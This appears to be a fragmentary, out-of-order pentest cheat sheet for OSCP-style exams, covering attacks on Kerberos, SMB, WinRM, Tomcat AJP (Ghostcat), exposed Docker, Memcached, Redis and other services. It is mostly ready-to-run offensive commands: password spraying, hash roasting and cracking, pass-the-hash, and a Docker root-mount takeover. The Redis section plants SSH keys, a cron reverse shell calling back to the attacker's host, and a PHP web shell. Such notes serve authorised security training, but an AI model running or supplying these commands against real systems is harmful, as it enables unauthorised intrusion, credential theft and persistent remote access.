docs.text:

Password spray via kerbrute

User enumeration (no creds, works if pre-auth is off)

AS-REP roast (harvest crackable hashes if pre-auth disabled) 
impacket-GetNPUsers $domain/ -usersfile users.txt -dc-ip $ip -no-pass

docs.title: 2. Authenticated Enumeration

AS-REP roast with creds

docs.title: 5.1 AS-REP roast → crack
docs.text:
impacket-GetNPUsers $domain/ -usersfile users.txt -dc-ip $ip -no-pass -format hashcat > asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt

docs.title: 5.2 Kerberoast → crack
docs.text:
impacket-GetUserSPNs $domain/$un:$pw -dc-ip $ip -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt wordlist.txt

docs.title: 5.3 Clock skew fix (KRB_AP_ERR_SKEW)

docs.title: 7. Post-Exploit / Pivot
docs.text:
• Cracked hashes → creds → reuse across services
  • Domain creds → secretsdump → NTLM hashes → pass-the-hash (see SMB/WinRM notes)

docs.title: Common gotchas
docs.text:
- Clock must be within ~5 min of the DC or you'll get KRB_AP_ERR_SKEW. Sync it.
- Kerberoast needs a domain user; AS-REP roast works with zero creds if pre-auth is off.
- Kerberos on OSCP = optional bonus. If you see 88 but no AD context, don't rabbit-hole.

Query via rpcclient (null session)

docs.text:
Endpoint dump (reveals what RPC services are exposed)

docs.title: Common gotchas
docs.text:
- 135 open usually means 445/139 open too — treat them together.
- wmiexec is quieter than psexec; try wmiexec first for a shell.
- "Access denied" on rpcclient = need creds (most boxes disable anonymous SID enum).

docs.title: Enumeration
docs.text:
SMB Sweep 

nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254

Queries valid netbios names 

sudo nbtscan -r 192.168.50.0/24

attempts OS discovery some nmap scripts check for exploitable versions 

nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152

windows tools 

net view \\dc01 /all

Enumerate without creds on enum4linux

docs.title: Config Paths
docs.text:
Samba 

/etc/samba/smb.conf
/usr/local/samba/lib/smb.conf
Windows Registry (share perms / audit) 
HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares

Config quick-reference: 

smb.conf     -> check for: writable = yes, guest ok = yes, valid users, restrict anonymous
Windows      -> check ADMIN$ / C$ write rights (that's the win, not the config file)

docs.title: Common gotchas
docs.text:
- 445 closed but 139 open? Try SMB1 via -p 139 / add 'client max protocol = SMB2' to smb.conf if modern target refuses SMB1.
- "NT_STATUS_LOGON_FAILURE" on a correct-looking pw? Try WORKGROUP vs domain, or add -d . for local auth.
- SMB signing disabled/required: 'nmap --script smb2-security-mode' reveals it — relay attacks need signing disabled.
- Kerberos vs NTLM: if clock skew / "KRB_AP_ERR_SKEW", check target timezone/drift.

docs.title: Command map (moved psexec/wmiexec here for context)
docs.text:
impacket-psexec  -> interactive SYSTEM shell (needs admin, port 445)
impacket-wmiexec -> shell over WMI (port 135/5985, quieter than psexec)
impacket-smbexec -> semi-interactive, uses SMB only
netexec          -> enumeration + creds + --exec-method smbexec/atexec for command exec

docs.title: Service Usage
docs.text:
Connect to WinRM with plaintext credentials 

evil-winrm -i $ip -u $un -p $pw
Connect using pass-the-hash (NTLM hash) 
evil-winrm -i $ip -u $un -H $ntlm_hash
Connect over TLS (5986) 
evil-winrm -i $ip -u $un -p $pw -S

docs.title: 0. Fast Path (try these first)
docs.text:
netexec check — valid creds and shell access show as (Pwn3d!) 

nxc winrm $ip -u $un -p $pw
Instant shell if you have administrator credentials 
evil-winrm -i $ip -u Administrator -p $pw
Instant shell with administrator NTLM hash 
evil-winrm -i $ip -u Administrator -H $hash

docs.title: 1. Banner Grab & Unauthenticated Enumeration
docs.text:
Version and default-script scan on WinRM ports 

nmap -p 5985,5986 -sV -sC $ip

docs.title: 2. Authenticated Enumeration
docs.text:
Auth check (cleanest signal, prints Pwn3d! on success) 

nxc winrm $ip -u $un -p $pw
Run a single cmd command without a full shell 
nxc winrm $ip -u $un -p $pw -x 'whoami'
Run a single PowerShell command 
nxc winrm $ip -u $un -p $pw -X 'whoami'
Open an interactive shell 
evil-winrm -i $ip -u $un -p $pw
Check current privileges 
whoami /priv
List local users 
net user
List local Administrators group 
net localgroup Administrators
Upload a file to the target 
upload /local/file C:\path\
Download a file from the target 
download C:\path\to\file /local/dest

docs.title: 3. Password Spraying / Bruteforcing
docs.text:
Highly relevant — WinRM is one of the best spraying targets (fast, low-noise). Spray a known password across users 

nxc winrm $ip -u users.txt -p 'Spring2026!' --continue-on-success
Spray across hosts with one admin credential 
nxc winrm targets.txt -u Administrator -p 'Passw0rd!' --continue-on-success
Brute force with hydra 
hydra -L users.txt -P pass.txt winrm://$ip

docs.title: 5.1 Valid creds → immediate shell
docs.text: evil-winrm -i $ip -u $un -p $pw

docs.title: 5.2 Pass-the-hash (if you have NTLM hash, no plaintext)
docs.text: evil-winrm -i $ip -u $un -H $hash

docs.title: 5.3 Check auth without logging in (clean spray signal)
docs.text: nxc winrm $ip -u $un -p $pw

docs.title: 5.4 Forced auth / delegation (rare on OSCP, note for AD)
docs.text:
# WinRM requires users in "Remote Management Users" or local admins
net localgroup "Remote Management Users"

docs.title: 6. Config Paths
docs.text:
WinRM service config 

winrm get winrm/config
winrm get winrm/config/service
Registry (override for port/auth) 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WS-Management\Service

Config quick-reference: 

AllowUnencrypted -> if true, 5985 accepts plaintext (default)
Auth -> Basic/Kerberos/Negotiate flags

docs.title: 7. Post-Exploit / Pivot
docs.text:
• WinRM shell → PrivEsc (see Windows PrivEsc notes)
  • Same creds → SMB/RDP notes for other boxes
  • Pass-the-hash → lateral movement across the set

docs.title: Common gotchas
docs.text:
- WinRM only works for admin / "Remote Management Users" members. Non-admin usually denied.
- 5985 = HTTP, 5986 = HTTPS. evil-winrm defaults to 5985.
- "The network path was not found" / connection refused = WinRM off, or firewall.
- Kerberos clock skew on AD sets — sync if SPN errors.
- If SMB (445) is closed, add -d DOMAIN to nxc to force WinRM-only auth (avoids SMB dependency).

docs.title: Service Usage
docs.text:
AJP is a binary protocol — no plaintext client. Interact via Ghostcat PoC scripts. Download the canonical ajpShooter PoC 

wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py

docs.title: 0. Fast Path (try these first)
docs.text:
Confirm AJP is open 

nmap -p 8009 -sV $ip
Check for Ghostcat (file read via AJP) 
python3 ajpShooter.py http://$ip:8080 8009 /WEB-INF/web.xml read
Syntax: ajpShooter.py <url> <ajp_port> <file> <read|eval>. url = Tomcat's HTTP URL, 8009 = AJP port, read mode prints the file.

docs.title: 1. Banner Grab & Unauthenticated Enumeration
docs.text:
Version and default-script scan 

nmap -p 8009 -sV -sC $ip
AJP auth/headers/methods NSE scripts 
nmap -p 8009 --script ajp-auth,ajp-headers,ajp-methods $ip

docs.title: 2. Authenticated Enumeration
docs.text:
Ghostcat gives file read without auth — use it to pull configs. Read web.xml 

python3 ajpShooter.py http://$ip:8080 8009 /WEB-INF/web.xml read
Read application.properties 
python3 ajpShooter.py http://$ip:8080 8009 /WEB-INF/classes/application.properties read
Read tomcat-users.xml 
python3 ajpShooter.py http://$ip:8080 8009 /conf/tomcat-users.xml read
Read server.xml 
python3 ajpShooter.py http://$ip:8080 8009 /conf/server.xml read

docs.title: 3. Password Spraying / Bruteforcing
docs.text: N/A for AJP itself. Tomcat manager creds = see HTTP notes.

docs.title: 5.1 Ghostcat → read arbitrary files inside any webapp
docs.text: python3 ajpShooter.py http://$ip:8080 8009 /WEB-INF/web.xml read

docs.title: 5.2 Ghostcat → RCE (requires an existing file-upload primitive)
docs.text:
# Upload a .txt/.jpg containing JSP code via an upload endpoint, then eval it:
python3 ajpShooter.py http://$ip:8080 8009 /uploads/shell.jpg eval

docs.title: 5.3 Tomcat manager creds found → WAR deploy RCE (see HTTP notes)
docs.text: # Upload a WAR via /manager, or use the manager interface

docs.title: 6. Config Paths
docs.text:
Tomcat 

/opt/tomcat/conf/server.xml
/opt/tomcat/conf/tomcat-users.xml
/opt/tomcat/conf/web.xml

Config quick-reference: 

server.xml -> AJP connector config (port 8009), secretRequired flag
tomcat-users.xml -> manager/role creds (often weak defaults)

docs.title: 7. Post-Exploit / Pivot
docs.text:
• Ghostcat file read → grab configs/creds → reuse
  • Tomcat manager creds → WAR deploy → shell (see HTTP notes)

docs.title: Common gotchas
docs.text:
- Vulnerable Tomcat: < 9.0.31, < 8.5.51, < 7.0.100 (patched versions enforce requiredSecret).
- Ghostcat = local file read (LFI), NOT direct remote file include (RFI). RCE needs an upload primitive.
- Use eval mode only if you already uploaded a JSP-as-other-extension file.
- The `url` arg is Tomcat's HTTP port (e.g., 8080), NOT the AJP port. AJP port is the separate arg.
- Note: other ghostcat.py PoCs exist with DIFFERENT syntax — ajpShooter.py is the canonical/reference one.
- AJP is Tomcat's hidden backdoor — if 8009 is open, this is likely the intended path.

docs.title: Service Usage
docs.text:
Query daemon version (unauth on 2375) 

curl -s http://$ip:2375/version
List running containers via docker client 
docker -H tcp://$ip:2375 ps -a

docs.title: 0. Fast Path (try these first)
docs.text:
Check if the daemon is exposed with no auth 

curl -s http://$ip:2375/version
If it returns JSON with "ApiVersion", you have root on the box.

docs.title: 1. Banner Grab & Unauthenticated Enumeration
docs.text:
Version and default-script scan 

nmap -p 2375,2376 -sV -sC $ip
Get daemon info manually 
curl -s http://$ip:2375/info
List containers manually 
curl -s http://$ip:2375/containers/json

docs.title: 2. Authenticated Enumeration
docs.text:
List images via docker client 

docker -H tcp://$ip:2375 images
List all containers via docker client 
docker -H tcp://$ip:2375 ps -a

docs.title: 3. Password Spraying / Bruteforcing
docs.text: N/A — either the API is open (no auth) or it uses client certs (2376).

docs.title: 5.1 Unauthenticated Docker → instant root
docs.text:
docker -H tcp://$ip:2375 run -it -v /:/mnt alpine chroot /mnt sh
# or just exec into a running root container
docker -H tcp://$ip:2375 exec -it <container_id> sh

docs.title: 5.2 Pull a privileged container
docs.text:
docker -H tcp://$ip:2375 run --rm -it --privileged -v /:/host alpine sh
# then: chroot /host

docs.title: 6. Config Paths
docs.text:
Docker daemon 

/etc/docker/daemon.json
/etc/systemd/system/docker.service
TLS certs (for 2376) 
~/.docker/ca.pem, cert.pem, key.pem

Config quick-reference: 

daemon.json -> "hosts": ["tcp://0.0.0.0:2375"], tls settings

docs.title: 7. Post-Exploit / Pivot
docs.text:
• Docker API → root on host (mount /, chroot)
  • Host filesystem → creds → reuse/pivot

docs.title: Common gotchas
docs.text:
- 2375 plaintext = no auth = instant root. 2376 = TLS, needs client certs (you likely don't have them).
- Always test /version first — it's the cleanest signal.

docs.text:
Connect with nc 

nc -nv $ip 6667
Connect with irssi (IRC client) 
irssi -c $ip -p 6667

Grab banner and MOTD 

timeout 5 nc $ip 6667

docs.title: 1. Banner Grab & Unauthenticated Enumeration
docs.text:
Version and default-script scan 

nmap -p 6667 -sV -sC $ip
Manual connection (leaks version, MOTD, channels) 
nc -nv $ip 6667
Set NICK during manual session 
NICK test

Set NICK during manual session

(List/who/topic commands for intel)

docs.text: N/A — IRC rarely brute-forced on OSCP. Skip.

docs.title: 5.1 Version + MOTD leak
docs.text: nc -nv $ip 6667     # banner often reveals server software + version

docs.title: 5.2 Vulnerable IRCd
docs.text: # UnrealIRCd 3.2.8.1 has a well-known backdoor RCE (searchsploit unrealircd)

UnrealIRCd 

/usr/local/unrealircd/unrealircd.conf
InspIRCd 
/etc/inspircd/inspircd.conf

docs.title: 7. Post-Exploit / Pivot
docs.text:
• Known IRCd backdoor → immediate shell (UnrealIRCd)
  • MOTD/channel intel → creds or hostnames

docs.title: Common gotchas
docs.text:
- UnrealIRCd 3.2.8.1 backdoor = the single most likely IRC vuln on OSCP. Check version first.
- IRC is almost never the intended path — treat as a quick check, then move on.

docs.title: Service Usage
docs.text:
Connect with nc 

nc -nv $ip 11211

docs.title: 0. Fast Path (try these first)
docs.text:
Test access and dump stats 

echo "stats" | nc $ip 11211
Dump item stats (to find slabs) 
echo "stats items" | nc $ip 11211

docs.title: 1. Banner Grab & Unauthenticated Enumeration
docs.text:
Version and default-script scan 

nmap -p 11211 -sV -sC $ip
Memcached-info NSE script 
nmap -p 11211 --script memcached-info $ip
Query version manually 
printf "version\r\n" | nc $ip 11211
Query stats manually 
printf "stats\r\n" | nc $ip 11211

docs.title: 2. Authenticated Enumeration
docs.text:
Memcached (old versions) has no auth — extract cached data here. Dump item stats 

echo "stats items" | nc $ip 11211
Dump a specific slab (replace placeholders) 
echo "stats cachedump <slab_id> <limit>" | nc $ip 11211
Automate full dump 
memcdump --servers=$ip

docs.title: 3. Password Spraying / Bruteforcing
docs.text: N/A — no auth (unless SASL, which is rare).

docs.title: 5.1 Cache contains app secrets
docs.text: memcdump --servers=$ip | grep -iE 'pass|token|key|session|user'

docs.title: 6. Config Paths
docs.text:
/etc/memcached.conf

Config quick-reference: 

-u root -> running as root (but memcached is just a cache, no RCE directly)
-l 0.0.0.0 -> listening externally

docs.title: 7. Post-Exploit / Pivot
docs.text:
• Cached session tokens → hijack sessions (see HTTP notes)
  • Cached creds → reuse elsewhere

docs.title: Common gotchas
docs.text:
- No RCE from memcached alone — it's a data/cache leak vector.
- Older memcached (<1.4.14?) had no SASL — open read. Newer may need SASL.

docs.title: Service Usage
docs.text:
Connect with redis-cli 

redis-cli -h $ip

docs.title: 0. Fast Path (try these first)
docs.text:
Test unauthenticated access (PONG = no auth needed) 

redis-cli -h $ip ping
Get server info 
redis-cli -h $ip info

docs.title: 1. Banner Grab & Unauthenticated Enumeration
docs.text:
Version and default-script scan 

nmap -p 6379 -sV -sC $ip
Redis-info NSE script 
nmap -p 6379 --script redis-info $ip
Get INFO manually 
redis-cli -h $ip INFO
Get all config values 
redis-cli -h $ip CONFIG GET *

docs.title: 2. Authenticated Enumeration
docs.text:
Get info with a password (requirepass or ACL) 

redis-cli -h $ip -a $pw info
Get the requirepass value 
redis-cli -h $ip -a $pw CONFIG GET requirepass
Dump all keys 
redis-cli -h $ip KEYS '*'

docs.title: 3. Password Spraying / Bruteforcing
docs.text:
Redis auth is a single password, not per-user. Try defaults first (foobared is the shipped example). Test the default password 

redis-cli -h $ip -a foobared ping
Brute force with hydra 
hydra -P pass.txt $ip redis
Brute force with nxc 
nxc redis $ip -p 6379 --pass-file pass.txt

docs.title: 5.1 No auth → RCE via modifying config (write SSH key or cron)
docs.text:
# Write SSH key (if we know a valid user + their home)
ssh-keygen -t rsa -f mykey -N ''
echo -e "\n\n$(cat mykey.pub)\n\n" > payload
redis-cli -h $ip set dump "$(cat payload)"
redis-cli -h $ip config set dir /root/.ssh/
redis-cli -h $ip config set dbfilename authorized_keys
redis-cli -h $ip save
ssh -i mykey root@$ip

docs.title: 5.2 RCE via cron (root Redis on Linux)
docs.text:
redis-cli -h $ip set cron '*/1 * * * * bash -i >& /dev/tcp/$myip/4444 0>&1'
redis-cli -h $ip config set dir /var/spool/cron/
redis-cli -h $ip config set dbfilename root
redis-cli -h $ip save

docs.title: 5.3 RCE via web shell (if a web root is reachable)
docs.text:
redis-cli -h $ip set shell '<?php system($_GET["cmd"]); ?>'
redis-cli -h $ip config set dir /var/www/html/
redis-cli -h $ip config set dbfilename shell.php
redis-cli -h $ip save
curl -s "http://$ip/shell.php?cmd=id"

docs.title: 6. Config Paths
docs.text:
/etc/redis/redis.conf

Config quick-reference: 

requirepass -> auth password
bind 127.0.0.1 -> if only localhost, it's not exposed... unless you're on the box

docs.title: 7. Post-Exploit / Pivot
docs.text:
• Redis RCE → root (if Redis runs as root)
  • Dump keys → find cached creds/session data

docs.title: Common gotchas
docs.text:
- Default config = no auth, but often binds to localhost only. If port shows open externally, you're likely in.
- If `bind 127.0.0.1` but you're on the box, localhost Redis is still a privesc vector.
- CONFIG SET requires the Redis process to have write perms to the target dir.
- Redis 6+ may need a username (AUTH default $pw) if ACL is configured — default user is "default".
- `foobared` is the example password left in many default configs.

docs.title: Service Usage
docs.text:
Connect with vncviewer (specific port) 

vncviewer $ip:$port
Connect by display number (display 1 = port 5901) 
vncviewer $ip:1

docs.title: Common gotchas
docs.text:
- Display N = port 5900+N. Display :0 = 5900, :1 = 5901.
- 5800 is HTTP (web VNC) on some old setups.
- VNC auth may not log failures — brute carefully.

docs.title: Hydra
docs.text:
hydra -l jason -P passwords.txt -t 4 -W 3 -o of.txt ftp://$ip
With HTTP you will need to get an indicated for a failed sign-in attempt where "Login failed." is 
hydra -L users.txt -P passwords.txt 192.168.0.25 http-post-form "/index.php:usr=^USER^&fm_pwd=^PASS^:Login failed. Wrong Use"

-l      # Single user
-p      # Single password
-L      # User file
-P      # Password file
-t      # Number of parallel tasks (default 16)
-o      # outfile
-W      # wait time for response
-s      # select non-standard port
-e nsr  #  try "n" null password, "s" login as pass and/or "r" reversed login
Hydra Supports over 50 protocols including: 
smtp, pop3, imap
ftp, sftp, tftp
ssh, telnet, rdp
mssql, mysql

docs.text:
REQUIRES

  • A service running via a binary you have permissions over
  • Said service to be running as a more privileged user

Find running services (This will not work in WinRM, use another protocol) 

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

docs.title: Record Types
docs.text:
- NS: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
- A: Also known as a host record, the "a record" contains the IPv4 address of a hostname.
- AAAA: Also known as a quad A host record, the "aaaa record" contains the IPv6 address of a hostname.
- MX: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
- PTR: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.
- CNAME: Canonical Name Records are used to create aliases for other host records.
- TXT: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.

docs.title: Common gotchas
docs.text:
- AXFR blocked? Try each NS record + the authoritative nameserver IPs directly.
- dig returns "connection timed out"? DNS may be TCP-only or behind firewall — try dig +tcp.
- version.bind often disabled — don't burn time on it.
- Subdomain brute is slow — start small wordlist, only grow if needed.

docs.text: Port: 21

docs.title: Service Usage
docs.text:
Basic login

Standard Commands 
PWD
LIST -la         # LIST -a surfaces dotfiles; many clients omit -a by default

STAT .           # same listing, control channel only
CWD /incoming    # enumerate common dirs by hand: /pub /upload /incoming /files /backup /www /home

**ALWAYS list with `-a` — dotfiles (`.htaccess`, `.bash_history`, `.ssh/`, backups) are the highest-yield FTP find.**

docs.text:

CWD .testdir
STOR probe.txt              -> 150/226 = upload allowed  (use a harmless name)
APPE probe.txt              -> append allowed
SITE CHMOD 777 probe.txt    -> 200 = permission control
SIZE probe.txt              -> confirms it landed
DELE probe.txt              -> cleanup
RMD .testdir

If SSL/TLS is enabled on this port (implicit/explicit ftps - implicit is normally on 990) 

openssl s_client -connect $ip:21 -starttls ftp

Login over TLS (if plaintext refused or FTPS detected): 

# Explicit FTPS (AUTH TLS)
lftp -u $un,$pw -e "set ftp:ssl-force true; set ftp:ssl-protect-data true; ls; bye" $ip
# Implicit FTPS (port 990 or given port)
lftp -u $un,$pw -e "set ftp:ssl-force true; set ftp:ssl-protect-data true; open ftps://$ip:990; ls; bye"

docs.title: Common gotchas
docs.text:
- Self-signed cert? curl -k or set insecure. Browsers block — use curl/burp.
- 403 on dir brute? Check for virtual host (Host header) or add -mc 403 to see them.
- .php .bak .old .txt .sql — always add extension list; source disclosure is huge.
- Upload dir non-executable? Look for .phtml/.php5 or bypass content-type/magic bytes.
- rate limiting? Slow hydra with -t 2 and add delay. Spray (one pass, many users) > brute (many passes, one user).

Standard Commands (inside the session)

docs.title: Common gotchas
docs.text:
- VRFY/EXPN disabled? Use RCPT TO — it's the reliable fallback and nearly always tells you 250 vs 550.
- Responses vary: 250/251/252 = exists, 550/551/553 = no such user, 450 = graylisting/temp.
- EHLO may need the correct domain — try $ip, localhost, or the actual target domain if EHLO is rejected.
- STARTTLS on 25 vs implicit TLS on 465 — get the port right or you'll get no banner.
- smtp-user-enum needs valid FROM — if it errors, add the target domain or use any legit-looking sender.

docs.title: Post-Enumeration
docs.text:
• Dumped users → spray across SMB/SSH/WinRM/HTTP
  • Dumped processes/software → identify vuln software for exploit selection
  • rwcommunity (write) → can set values (sometimes used to write routes/config)

docs.title: Common gotchas
docs.text:
- UDP-based → use -sU on nmap, and note UDP scans are slow.
- Only v2c/v1 typically. v3 needs auth/priv creds (rare on OSCP).
- Public (read-only) is enough to win — write community (private) is a bonus, not required.
- onesixtyone is much faster than snmpwalk for brute — use it first.
- onesixtyone -c <file> $ip works, but for many hosts use -i targets.txt.

docs.title: SSH
docs.text: Port: 22

docs.title: Service Usage
docs.text:
Connect with ssh 

ssh -i keyfile $un@$ip
Create ssh key 
ssh-keygen -t rsa -f mykey -N ''

docs.title: Config Paths
docs.text:
sshd 

/etc/ssh/sshd_config
/etc/ssh/ssh_config
User keys 
~/.ssh/id_rsa
~/.ssh/authorized_keys
/home/*/.ssh/

Config quick-reference: 

sshd_config -> PermitRootLogin, PasswordAuthentication, AuthorizedKeysFile, AllowUsers
authorized_keys -> whose keys can log in as whom

docs.title: Common gotchas
docs.text:
- "Permission denied (publickey)" = trying to use key but no key/password auth. Check which auth methods offered.
- Key perms too open? ssh ignores them — chmod 600 first.
- Strict host key warnings on repeat? Use -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null.
- SSH brute = last resort; it's the noisiest and slowest thing you can do.

telnetd (Linux, if xinetd/inetd) 

/etc/inetd.conf
/etc/xinetd.d/telnet

docs.title: Common gotchas
docs.text:
- Telnet = plaintext; creds sniffable if you're MITM (rare on OSCP).
- Network devices (routers/switches) are the main telnet targets on exams.
- No encryption — don't expect SSH-like behaviour.

Download a file (non-interactive)

Upload a file (non-interactive)

Config quick-reference: 

TFTP_DIRECTORY -> /srv/tftp or /tftpboot (what's served)

docs.title: Common gotchas
docs.text:
- UDP-based (69) and tiny blocks — use -c carefully; large transfers fail.
- No directory listing — you must know/guess filenames. Use wordlists of common device config names.
